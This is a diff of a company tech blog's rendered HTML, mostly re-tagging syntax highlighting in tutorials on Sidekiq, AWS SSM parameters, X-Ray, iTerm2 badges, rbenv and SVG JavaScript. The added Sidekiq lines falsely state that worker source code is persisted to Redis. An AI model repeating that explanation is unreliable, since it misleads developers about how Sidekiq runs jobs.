-  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;perform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;article&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;c1&quot;&gt;# writes a blog post&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;class BlogPostWorker
+  include Sidekiq::Worker
+  def perform(subject, title, article)
+    # writes a blog post
+  end
+end
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Now that we have created a worker, we can create jobs with that worker. Open up a rails console within your application and create some jobs.&lt;/p&gt;
 
@@ -695,20 +154,20 @@ In the end, all teams will have to agree to it, and roll out with InkyCop to uni
 
 &lt;p&gt;&lt;code&gt;bundle exec sidekiq&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;Sidekiq will crawl the application for any &lt;code&gt;Sidekiq::Worker&lt;/code&gt; classes and initialize the source code of each method within the class inside of the sidekiq process. This is key because it allows the code to be executed asynchronously over several worker processes in parallel. After the sidekiq worker process starts up it will start polling its respective queues looking for jobs.&lt;/p&gt;
+&lt;p&gt;Sidekiq will crawl the application for any &lt;code&gt;Sidekiq::Worker&lt;/code&gt; classes and persist the source code of each method within the class to Redis. This is key because it allows the code to be executed asynchronously over several worker processes in parallel. After the sidekiq worker process starts up it will start polling its respective queues looking for jobs.&lt;/p&gt;
 
-&lt;p&gt;Pro Tip: Whenever you change code inside your workers, it is always safest to restart your sidekiq worker process so that Sidekiq has the latest version of your worker code.&lt;/p&gt;
+&lt;p&gt;Pro Tip: Whenever you change code inside your workers, it is always safest to restart your sidekiq worker process so that Redis has the latest version of your worker code.&lt;/p&gt;
 
 &lt;h5 id=&quot;sidekiq-queues&quot;&gt;Sidekiq Queues&lt;/h5&gt;
 
 &lt;p&gt;If we wanted to create a high priority queue, we can achieve this by simply configuring workers to queue jobs into a new queue.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BlogPostWorker&lt;/span&gt;
-  &lt;span class=&quot;kp&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Sidekiq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Worker&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;sidekiq_options&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;queue: :critical&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;perform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;article&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;c1&quot;&gt;# writes a blog post&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;class BlogPostWorker
+  include Sidekiq::Worker
+  sidekiq_options queue: :critical
+  def perform(subject, title, article)
+    # writes a blog post
+  end
+end
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;We can tell the sidekiq worker process about this queue when we start the process.&lt;/p&gt;
 
@@ -718,7 +177,7 @@ In the end, all teams will have to agree to it, and roll out with InkyCop to uni
 
 &lt;p&gt;In this post, we have gone over how to configure your rails application and write some worker code that executes when a sidekiq worker process can pull a new job from a queue. Congratulations, you now know how to do simple background processing with sidekiq. Background jobs are very useful when you need compute cycles done behind the scenes without affecting the user experience.&lt;/p&gt;
 
-&lt;p&gt;Next post we will take a look at how to optimize your sidekiq architecture for maximum parallelism. We will introduce batching and handling the completion of your jobs.&lt;/p&gt;
+&lt;p&gt;Next post we will take a look at how to optimize cyour sidekiq architecture for maximum parallelism. We will introduce batching and handling the completion of your jobs.&lt;/p&gt;
 
 &lt;p&gt;Thank you for visiting the Custom Ink Tech Blog and taking a moment to read my first post. Please feel free to comment and ask questions below.&lt;/p&gt;
 
@@ -847,7 +306,7 @@ This helps down the line so you know what applications are more fragile, how you
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;aws ssm put-parameter &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/config/production/myapp/env/SECRET_KEY_BASE&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;--type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SecureString&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;--value&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;rails secret&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;--value&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;rails secret&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;The &lt;code&gt;name&lt;/code&gt; option is our path and is an example hierarchy, you can come up with your own. But here is how we have structured ours.&lt;/p&gt;
 
@@ -1816,7 +1275,7 @@ The other, more pressing, issue was building the array of map data to send to th
 &lt;p&gt;At CustomInk we use Rollbar for all of our error reporting. When using Rollbar with Lambda, take advantage of their out of the box &lt;a href=&quot;https://rollbar.com/blog/lambda-support-for-nodejs-python/&quot;&gt;integration for lambda&lt;/a&gt;.&lt;/p&gt;
 
 &lt;p&gt;I would also strongly suggest setting up X-Ray. This service proved to be invaluable during development allowing us to see slow paths in our code. If you use promises to structure your code i&amp;#39;ve found the following snippet to be helpful:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;AWSXRay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;aws-xray-sdk-core&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;AWSXRay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'aws-xray-sdk-core'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
 &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TRACE_ID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_X_AMZN_TRACE_ID&lt;/span&gt;
 
@@ -2375,7 +1834,7 @@ Our stateful product cards driven by color filters will be visually different in
 
 &lt;p&gt;You now need to write a special function in &lt;code&gt;.zshrc&lt;/code&gt; that Zsh understands. It looks like this:&lt;/p&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;iterm2_print_user_vars&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  iterm2_set_user_var bananas &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;do_fun_stuff&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+  iterm2_set_user_var bananas &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;do_fun_stuff&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;The function &lt;code&gt;iterm2_print_user_vars()&lt;/code&gt; calls &lt;code&gt;iterm2_print_user_vars()&lt;/code&gt; one or more times. The function &lt;code&gt;iterm2_set_user_var&lt;/code&gt; assigns your &lt;code&gt;user var&lt;/code&gt; &lt;code&gt;bananas&lt;/code&gt; to &lt;code&gt;do_fun_stuff&lt;/code&gt;, which can be written directly there or encapsulated in another function.&lt;/p&gt;
@@ -2390,11 +1849,11 @@ Our stateful product cards driven by color filters will be visually different in
 
 &lt;p&gt;Add the following to your &lt;code&gt;.zshrc&lt;/code&gt;:&lt;/p&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;iterm2_print_user_vars&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  iterm2_set_user_var gitDiff &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;is_git_branch_dirty&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+  iterm2_set_user_var gitDiff &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;is_git_branch_dirty&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
 
 &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is_git_branch_dirty &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;git diff &lt;span class=&quot;nt&quot;&gt;--shortstat&lt;/span&gt; 2&amp;gt; /dev/null | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n1&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;⚡⚡&quot;&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;git diff &lt;span class=&quot;nt&quot;&gt;--shortstat&lt;/span&gt; 2&amp;gt; /dev/null | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n1&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;⚡⚡&quot;&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Add &lt;code&gt;\(user.gitDiff)&lt;/code&gt; to your badge in the profile settings.&lt;/p&gt;
@@ -2403,7 +1862,7 @@ Our stateful product cards driven by color filters will be visually different in
 
 &lt;h4 id=&quot;how-to-add-a-camel-on-wednesdays-and-an-octopus-on-others&quot;&gt;How to add a camel on Wednesdays and an Octopus on others&lt;/h4&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is_it_wednesday &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt; +%A&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Wednesday&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt; +%A&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Wednesday&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;then
      &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;🐪&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Camel Prompt&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;else
@@ -5534,7 +4993,7 @@ a Rails 3.2 upgrade.&lt;/p&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;$ bundle binstubs guard
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Lastly, if you have never done so, change your shell&amp;#39;s &lt;code&gt;PATH&lt;/code&gt; to look for the local &lt;code&gt;./bin&lt;/code&gt; directory before any others. I do this after my rbenv initialization.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;rbenv init -&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;rbenv init -&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./bin:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h4 id=&quot;routes-file&quot;&gt;Routes File&lt;/h4&gt;
@@ -5859,11 +5318,11 @@ The event was a great success! Big thanks to &lt;a href=&quot;https://twitter.co
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;object&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;data=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;our-awesome.svg&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;image/svg+xml&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/object&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Now that our SVG&amp;#39;s JavaScript will execute, how do we go about adding &lt;code&gt;&amp;lt;use&amp;gt;&lt;/code&gt; elements to our SVG&amp;#39;s document? Fortunately the techniques are very similar to how you would do this with vanilla JavaScript and the HTML DOM. The minor difference is that we have to use two namespaces. One for creating elements and the second for adding the xlink attribute. I recommend we start our JavaScript off with these namespaces as vars. We also want to create variables for our canvas width and height. Finally, we want a handle to our starfield group element.&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xmlns&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://www.w3.org/2000/svg&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;xlinkns&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://www.w3.org/1999/xlink&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xmlns&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://www.w3.org/2000/svg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;xlinkns&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://www.w3.org/1999/xlink&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;width&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
     &lt;span class=&quot;nx&quot;&gt;height&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;700&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;starfield&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;starfield&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;starfield&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;starfield&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h3 id=&quot;random-javascript-helpers&quot;&gt;Random JavaScript Helpers&lt;/h3&gt;
 
@@ -5892,9 +5351,9 @@ The event was a great success! Big thanks to &lt;a href=&quot;https://twitter.co
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;randomScaleNamed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;scale&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;star&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;scale&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;randomScale&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;burst&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;scale&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;randomScale&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;steeler&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;scale&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;randomScale&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'star'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;scale&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;randomScale&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'burst'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;scale&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;randomScale&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'steeler'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;scale&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;randomScale&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
